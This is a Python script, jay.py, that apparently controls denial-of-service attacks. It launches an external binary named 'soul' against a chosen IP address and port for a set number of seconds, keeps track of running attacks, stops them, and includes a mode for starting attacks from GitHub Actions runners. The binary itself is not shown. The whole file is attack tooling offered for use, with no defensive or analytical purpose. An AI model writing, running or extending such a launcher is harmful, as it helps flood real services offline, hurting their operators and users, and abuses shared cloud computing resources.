# jay.py
import subprocess
import time
import threading
import sys
import os

active_tasks = {}
task_lock = threading.Lock()

def launch_attack(ip, port, time_val):
    try:
        key = (ip, str(port), str(time_val))
        
        with task_lock:
            if key in active_tasks:
                return False
            
            print(f"[+] New task: {ip}:{port} for {time_val}s")
            try:
                # Check if soul binary exists
                if not os.path.exists("./soul"):
                    print("[!] Error: soul binary not found")
                    return False
                
                # Make sure soul is executable
                if not os.access("./soul", os.X_OK):
                    os.chmod("./soul", 0o755)
                
                process = subprocess.Popen(['./soul', ip, str(port), str(time_val), '900'])
                print(f"[+] Binary started: ./soul {ip} {port} {time_val} 900 (PID: {process.pid})")
                
                active_tasks[key] = {
                    'process': process,
                    'start_time': time.time(),
                    'duration': int(time_val)
                }
                return True
            except Exception as e:
                print(f"[!] Failed to launch: {e}")
                return False
    except Exception as e:
        print(f"[!] Error in launch_attack: {e}")
        return False

def stop_attack(ip, port):
    try:
        with task_lock:
            for key in list(active_tasks.keys()):
                if key[0] == ip and key[1] == str(port):
                    process_info = active_tasks[key]
                    try:
                        process_info['process'].terminate()
                        process_info['process'].wait(timeout=5)
                    except:
                        try:
                            process_info['process'].kill()
                        except:
                            pass
                    
                    del active_tasks[key]
                    print(f"[+] Stopped attack on {ip}:{port}")
                    return True
            
            return False
    except Exception as e:
        print(f"[!] Error in stop_attack: {e}")
        return False

def cleanup_finished_tasks():
    while True:
        try:
            with task_lock:
                tasks_to_delete = []
                for key, info in active_tasks.items():
                    if info['process'].poll() is not None:
                        ip, port, time_val = key
                        print(f"[+] Task finished: {ip}:{port}")
                        tasks_to_delete.append(key)
                    
                    elapsed = time.time() - info['start_time']
                    if elapsed > info['duration'] + 10:
                        ip, port, time_val = key
                        print(f"[+] Force cleaning stale task: {ip}:{port}")
                        try:
                            info['process'].terminate()
                        except:
                            pass
                        tasks_to_delete.append(key)
                
                for key in tasks_to_delete:
                    del active_tasks[key]
        except Exception as e:
            print(f"[!] Error in cleanup: {e}")
        
        time.sleep(5)

# Support command line arguments for GitHub Actions
if len(sys.argv) == 4:
    ip, port, time_val = sys.argv[1], sys.argv[2], sys.argv[3]
    print(f"[GitHub Action] Starting attack: {ip}:{port} for {time_val}s")
    success = launch_attack(ip, port, time_val)
    if success:
        print(f"[GitHub Action] Attack started successfully")
        # Wait for attack to complete
        time.sleep(int(time_val))
        print(f"[GitHub Action] Attack completed")
    else:
        print(f"[GitHub Action] Failed to start attack")
        sys.exit(1)

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_finished_tasks, daemon=True)
cleanup_thread.start()

# Keep the script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Shutting down...")
